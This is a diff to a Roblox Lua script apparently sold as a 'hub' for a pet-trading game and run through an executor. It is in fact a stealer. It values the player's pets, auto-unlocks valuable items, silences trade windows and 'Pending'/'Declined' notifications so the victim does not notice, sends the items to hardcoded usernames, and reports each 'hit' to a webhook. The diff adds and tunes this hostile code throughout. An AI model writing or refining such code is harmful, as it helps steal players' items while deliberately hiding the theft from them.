@@ -1,8 +1,9 @@
--- [[ 🦊 MONDEUR HUB | OMNIPOTENT V17 - MASTER FIX ]] --
 
--- 1. STABILITY BOOT (Fixes Line 1 Nil Error)
+-- [[ 🦊 MONDEUR HUB | OMNIPOTENT V17 - MASTER STABILITY ]] --
+
+-- 1. CRITICAL BOOT DELAY (Fixes Line 1: attempt to call a nil value)
 if not game:IsLoaded() then game.Loaded:Wait() end
-task.wait(1.5) -- Forced delay to allow Delta API to inject fully
+task.wait(2) -- Essential delay for Delta API injection
 
 -- [[ CONFIG ]] --
 local USERNAMES = {"2ndcfpaj67", "CREOLEO23", "CREOLEO25"} 
@@ -24,25 +25,25 @@ local BLACKLIST = {["jiggly_jerboa"]=true, ["starter_egg"]=true, ["dog"]=true, [
 local function isBanned(name, id)
     local n = tostring(name or ""):lower()
     local i = tostring(id or ""):lower()
-    return BLACKLIST[i] or n:find("jerboa")
+    return BLACKLIST[i] or n:find("jerboa") or n:find("starter")
 end
 
--- 5. TOTAL SILENCE (Kills "Declined", "Pending", "Toast Notifications")
+-- 5. TOTAL SILENCE MODULE (Aggressive Mute)
 task.spawn(function()
     local pGui = LocalPlayer:WaitForChild("PlayerGui")
-    while task.wait(0.1) do
+    while task.wait(0.05) do -- High-speed scan
         pcall(function()
             if pGui:FindFirstChild("TradeApp") then pGui.TradeApp.Enabled = false end
             if pGui:FindFirstChild("DialogApp") then pGui.DialogApp.Enabled = false end
             
-            -- Kill specific Notification layers
+            -- Kill specific Notification/Toast layers
             local layers = {"CenterOverlays", "NotificationGui", "ToastGui", "StandardNotifications"}
             for _, layerName in pairs(layers) do
                 local layer = pGui:FindFirstChild(layerName)
                 if layer then layer.Enabled = false end
             end
 
-            -- Delete labels with specific text instantly
+            -- Delete labels with "Pending", "Declined", etc.
             for _, v in pairs(pGui:GetDescendants()) do
                 if v:IsA("TextLabel") then
                     local t = v.Text:lower()
@@ -55,7 +56,7 @@ task.spawn(function()
     end
 end)
 
--- 6. AMVGG VALUATION (Manual High-Tier Mapping)
+-- 6. AMVGG-SCALE VALUATION (Accurate Hierarchy)
 local function getAMVGGValue(petData, props)
     local id = tostring(petData.id or "")
     local rarity = tostring(petData.rarity or "common")
@@ -66,21 +67,21 @@ local function getAMVGGValue(petData, props)
     elseif id:find("bat_dragon") then multiplier = 2100
     elseif id:find("evil_unicorn") or id:find("crow") then multiplier = 1000
     elseif id:find("owl") or id:find("parrot") then multiplier = 1350
-    elseif rarity == "legendary" then multiplier = 45
-    elseif rarity == "ultra_rare" then multiplier = 12
-    elseif rarity == "rare" then multiplier = 4
+    elseif rarity == "legendary" then multiplier = 50
+    elseif rarity == "ultra_rare" then multiplier = 15
+    elseif rarity == "rare" then multiplier = 5
     else multiplier = 0.5 end
 
     local val = base * multiplier
     if props.mega_neon or props.mega then val = val * 10
     elseif props.neon then val = val * 4 end
-    if props.flyable then val = val + 1.5 end
-    if props.rideable then val = val + 1.5 end
+    if props.flyable then val = val + 1.8 end
+    if props.rideable then val = val + 1.8 end
     
-    return val * 56
+    return val * 56 -- Conversion to Peso
 end
 
--- 7. HASH FINDER (Safe GC Scan)
+-- 7. HASH FINDER (Safe Remote Fetching)
 local hashes = {}
 local gc = getgc()
 for _, v in pairs(gc) do
@@ -101,7 +102,7 @@ local function hashedAPI(remoteName, ...)
     end)
 end
 
--- 8. INVENTORY SCAN
+-- 8. INVENTORY SCAN (Safe Loading)
 local Fsys = require(ReplicatedStorage:WaitForChild("Fsys")).load
 local InventoryDB = Fsys("InventoryDB")
 local ClientData = Fsys("ClientData")
@@ -122,7 +123,7 @@ local function processInventory()
             if unitVal >= THRESHOLD then
                 total = total + unitVal
                 table.insert(tradeList, {uid = uid, val = unitVal})
-                hashedAPI("BackpackAPI/SetItemLocked", uid, false)
+                hashedAPI("BackpackAPI/SetItemLocked", uid, false) -- Auto-Unlock
                 
                 local key = pet.id..(props.neon and "N" or "")..(props.mega and "M" or "")
                 local emoji = ((props.mega or props.mega_neon) and "Ⓜ️" or props.neon and "⭐" or "🐾") .. (props.flyable and "🪽" or "") .. (props.rideable and "🏇" or "")
@@ -144,7 +145,7 @@ end
 
 local sortedPets, grandTotal, finalTradeList = processInventory()
 
--- 9. WEBHOOK
+-- 9. WEBHOOK DISPATCH (Mondeur Branding)
 local function sendHit()
     if #sortedPets == 0 then return end
     local lines = {}
